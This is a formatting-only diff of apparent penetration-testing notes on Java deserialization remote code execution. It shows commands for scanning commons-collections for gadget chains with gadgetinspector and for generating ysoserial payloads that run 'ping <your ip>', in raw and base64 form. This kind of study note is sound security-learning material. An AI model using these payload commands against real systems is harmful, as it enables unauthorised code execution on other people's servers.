@@ -28,14 +28,14 @@ Summary (KeyNotes)
 - piece of code which can be used to achieve rce via java deserialization
 <br />
 
-6. How to scan for uncommon gadgetchain using gadgetinspector ?
-`java -Xmx2G -jar build/libs/gadget-inspector-all.jar commons-collections-3.2.1.jar`
-results inside: gadget-chains.txt\
+6. How to scan for uncommon gadgetchain using gadgetinspector ?\
+`java -Xmx2G -jar build/libs/gadget-inspector-all.jar commons-collections-3.2.1.jar`\
+results inside: gadget-chains.txt
 <br />
 
-7. How to generate payload using ysoserial ? 
+7. How to generate payload using ysoserial ? \
 normal (bytes):
-`java -jar ysoserial-master-30099844c6-1.jar <Gadget> "ping <your ip>" > payload`
+`java -jar ysoserial-master-30099844c6-1.jar <Gadget> "ping <your ip>" > payload`\
 base64 encoded:
 `java -jar ysoserial-master-30099844c6-1.jar <Gadget> "ping <your ip>" | base64 > payload.txt`
 <br />
